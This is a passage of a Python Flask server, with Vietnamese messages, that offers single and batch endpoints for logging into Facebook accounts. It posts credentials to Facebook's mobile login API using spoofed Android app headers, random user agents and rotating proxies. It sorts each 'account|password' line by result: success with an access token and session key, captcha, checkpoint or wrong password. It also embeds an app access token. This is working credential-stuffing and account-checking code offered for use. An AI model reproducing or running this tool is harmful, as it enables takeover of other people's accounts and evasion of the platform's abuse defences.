    "Dalvik/2.1.0 (Linux; U; Android 11; M2103K19G Build/RKQ1.200826.002) [FBAN/FB4A;FBAV/425.0.0.22.49;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/553450678;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2103K19G;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; LM-G710 Build/PKQ1.181105.001) [FBAN/FB4A;FBAV/398.0.0.21.106;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/664561789;FBCR/MobiFone;FBMF/LG;FBBD/LG;FBDV/LM-G710;FBSV/9;FBCA/arm64-v8a;FBDM/{density=2.625,width=1080,height=2248};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 13; RMX3663 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/448.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/775672890;FBCR/VinaPhone;FBMF/realme;FBBD/realme;FBDV/RMX3663;FBSV/13;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2412};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950F Build/R16NW) [FBAN/FB4A;FBAV/388.0.0.29.104;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/886783901;FBCR/Viettel;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G950F;FBSV/8.0.0;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2220};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9S Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/412.0.0.36.116;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/997894012;FBCR/MobiFone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 9S;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; CPH2179 Build/RKQ1.201217.002) [FBAN/FB4A;FBAV/430.0.0.23.113;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/108905123;FBCR/VinaPhone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2179;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; M2101K7AG Build/SKQ1.210908.001) [FBAN/FB4A;FBAV/440.0.0.33.118;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/219016234;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2101K7AG;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A205F Build/PPR1.180610.011) [FBAN/FB4A;FBAV/405.0.0.23.72;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/330127345;FBCR/MobiFone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A205F;FBSV/9;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-A546B Build/TP1A.220624.014) [FBAN/FB4A;FBAV/452.0.0.40.124;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/441238456;FBCR/VinaPhone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A546B;FBSV/13;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; VS2015 Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/418.0.0.33.69;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/552349567;FBCR/Viettel;FBMF/Vsmart;FBBD/Vsmart;FBDV/VS2015;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; RMX3261 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/433.0.0.32.110;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/663450678;FBCR/MobiFone;FBMF/realme;FBBD/realme;FBDV/RMX3261;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J730F Build/M1AJQ) [FBAN/FB4A;FBAV/392.0.0.32.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/774561789;FBCR/VinaPhone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-J730F;FBSV/8.1.0;FBCA/armeabi-v7a;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; M2004J19C Build/SKQ1.210908.001) [FBAN/FB4A;FBAV/445.0.0.35.120;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/885672890;FBCR/Viettel;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/M2004J19C;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; CPH1835 Build/QKQ1.200216.002) [FBAN/FB4A;FBAV/420.0.0.37.58;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/996783901;FBCR/MobiFone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1835;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 7 Build/PKQ1.180904.001) [FBAN/FB4A;FBAV/408.0.0.24.107;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/107894012;FBCR/VinaPhone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 7;FBSV/9;FBCA/arm64-v8a;FBDM/{density=2.625,width=1080,height=2340};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 13; RMX3686 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/455.0.0.38.122;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218905123;FBCR/Viettel;FBMF/realme;FBBD/realme;FBDV/RMX3686;FBSV/13;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2412};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-M315F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/428.0.0.26.117;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/329016234;FBCR/MobiFone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-M315F;FBSV/11;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1600};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi 9 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/415.0.0.35.114;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/440127345;FBCR/VinaPhone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 9;FBSV/10;FBCA/arm64-v8a;FBDM/{density=2.0,width=720,height=1600};FB_FW/1;FBRV/0;]",
    "Dalvik/2.1.0 (Linux; U; Android 12; CPH2399 Build/SP1A.210812.016) [FBAN/FB4A;FBAV/438.0.0.33.120;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/551238456;FBCR/Viettel;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2399;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2412};FB_FW/1;FBRV/0;]"
]

@app.route('/api/v1/auth', methods=['POST'])
def auth():
    try:
        data = request.get_json()

        if not data:
            return jsonify({
                "success": False,
                "message": "Vui lòng gửi dữ liệu JSON"
            }), 400

        username = data.get('username')
        password = data.get('password')

        if not username or not password:
            return jsonify({
                "success": False,
                "message": "Thiếu username hoặc password"
            }), 400

        result = facebook_login(username, password)

        return jsonify(result), result.get('status_code', 200)

    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi server: {str(e)}"
        }), 500


def facebook_login(uid_phone_mail, password):
    url = "https://b-graph.facebook.com/auth/login"

    ua = random.choice(USER_AGENTS)

    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
        "x-fb-net-hni": "45201",
        "zero-rated": "0",
        "x-fb-sim-hni": "45201",
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-friendly-name": "authenticate",
        "x-fb-connection-bandwidth": "78032897",
        "x-tigon-is-retry": "False",
        "user-agent": ua,
        "authorization": "OAuth null",
        "x-fb-connection-type": "WIFI",
        "x-fb-device-group": "3342",
        "priority": "u=3,i",
        "x-fb-http-engine": "Liger",
        "x-fb-client-ip": "True",
        "x-fb-server-cluster": "True"
    }

    data = {
        "adid": "a63f3e1b-4446-40dd-be8f-9a01e5207062",
        "format": "json",
        "device_id": "a22b194a-84c4-4dcf-8e8e-ecc05ae474ad",
        "email": uid_phone_mail,
        "password": password,
        "generate_analytics_claim": "1",
        "community_id": "",
        "linked_guest_account_userid": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": "a22b194a-84c4-4dcf-8e8e-ecc05ae474ad",
        "secure_family_device_id": "95ea3bfe-07d8-4863-a520-4dbe79704e04",
        "sim_serials": '["89014103211118510720"]',
        "credentials_type": "password",
        "openid_flow": "android_login",
        "openid_provider": "google",
        "openid_tokens": "[]",
        "account_switcher_uids": '["' + uid_phone_mail + '"]',
        "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
        "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
        "enroll_misauth": "false",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "machine_id": "EvuAZ37kNVMnKcUo51EIB9uP",
        "jazoest": "22610",
        "meta_inf_fbmeta": "V2_UNTAGGED",
        "advertiser_id": "a63f3e1b-4446-40dd-be8f-9a01e5207062",
        "encrypted_msisdn": "",
        "currently_logged_in_userid": "0",
        "locale": "vi_VN",
        "client_country_code": "VN",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "sig": "214049b9f17c38bd767de53752b53946",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    }

    proxies = get_random_proxy()
    
    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=30)

        try:
            response_json = response.json()

            if 'error' in response_json:
                error = response_json['error']
                error_subcode = error.get('error_subcode', 0)
                
                if error_subcode == 1348023:
                    msg = f"{uid_phone_mail}|{password}| Bị dính captcha spam"
                elif error_subcode == 1348162:
                    msg = f"{uid_phone_mail}|{password}| Checkpoint - Cần phê duyệt đăng nhập (new)"
                elif error_subcode == 1348033:
                    msg = f"{uid_phone_mail}|{password}| Checkpoint - Cần phê duyệt đăng nhập (new)"
                elif error_subcode == 1348131:
                    msg = f"{uid_phone_mail}|{password}| Thông tin đăng nhập không chính xác"
                else:
                    error_msg = error.get('error_user_msg', error.get('message', 'Lỗi không xác định'))
                    msg = f"{uid_phone_mail}|{password}| Lỗi không xác định: {error_msg}"
                
                return {
                    "status": "error",
                    "msg": msg,
                    "error_subcode": error_subcode,
                    "status_code": 401
                }
            
            if 'session_key' in response_json and 'access_token' in response_json:
                return {
                    "status": "success",
                    "msg": f"{uid_phone_mail}|{password}| Đăng nhập thành công",
                    "access_token": response_json.get('access_token'),
                    "uid": response_json.get('uid'),
                    "session_key": response_json.get('session_key'),
                    "data": response_json,
                    "status_code": 200
                }
            else:
                return {
                    "status": "error",
                    "msg": f"{uid_phone_mail}|{password}| Không rõ kết quả đăng nhập",
                    "data": response_json,
                    "status_code": 400
                }

        except json.JSONDecodeError:
            return {
                "status": "error",
                "msg": f"{uid_phone_mail}|{password}| Response không phải là JSON hợp lệ",
                "raw_response": response.text,
                "status_code": 500
            }

    except requests.exceptions.Timeout:
        return {
            "status": "error",
            "msg": f"{uid_phone_mail}|{password}| Request timeout - Vui lòng thử lại",
            "status_code": 408
        }
    except requests.exceptions.RequestException as e:
        return {
            "status": "error",
            "msg": f"{uid_phone_mail}|{password}| Lỗi kết nối: {str(e)}",
            "status_code": 500
        }


@app.route('/api/v1/auth/batch', methods=['POST'])
def auth_batch():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                "success": False,
                "message": "Vui lòng gửi dữ liệu JSON"
            }), 400
        
        accc = data.get('acc')
        
        if not accc:
            return jsonify({
                "success": False,
                "message": "Thiếu trường 'acc'"
            }), 400
        
        accounts = accc.strip().split('\n')
        
        if not accounts:
            return jsonify({
                "success": False,
                "message": "Không có tài khoản nào để xử lý"
            }), 400
        
        results = []
        success_count = 0
        fail_count = 0
        
        for idx, account in enumerate(accounts, 1):
            account = account.strip()
            
            if not account:
                continue
            
            if '|' not in account:
                results.append({
                    "index": idx,
                    "account": account,
                    "success": False,
                    "message": "Định dạng không hợp lệ (cần: tk|mk)"
                })
                fail_count += 1
                continue
            
            parts = account.split('|', 1)
            if len(parts) != 2:
                results.append({
                    "index": idx,
                    "account": account,
                    "success": False,
                    "message": "Định dạng không hợp lệ (cần: tk|mk)"
                })
                fail_count += 1
                continue
            
            username = parts[0].strip()
            password = parts[1].strip()
            
            if not username or not password:
                results.append({
                    "index": idx,
                    "account": account,
                    "success": False,
                    "message": "Username hoặc password trống"
                })
                fail_count += 1
                continue
            
            result = facebook_login(username, password)
            
            is_success = result.get('status') == 'success'
            
            if is_success:
                success_count += 1
            else:
                fail_count += 1

            final_result = {
                "index": idx,
                "username": username,
                "status": result.get('status'),
                "msg": result.get('msg')
            }

            results.append(final_result)
        
        return jsonify({
            "success": True,
            "message": f"Đã xử lý {len(results)} tài khoản",
            "summary": {
                "total": len(results),
                "success": success_count,
                "failed": fail_count
            },
            "results": results
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Lỗi server: {str(e)}"
        }), 500




if __name__ == '__main__':
    print("=" * 50)
    print("🚀 Facebook Auth API Server")
    print("=" * 50)
    print("📍 Single Login: POST /api/v1/auth")
    print("📍 Batch Login: POST /api/v1/auth/batch")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5001, debug=True)
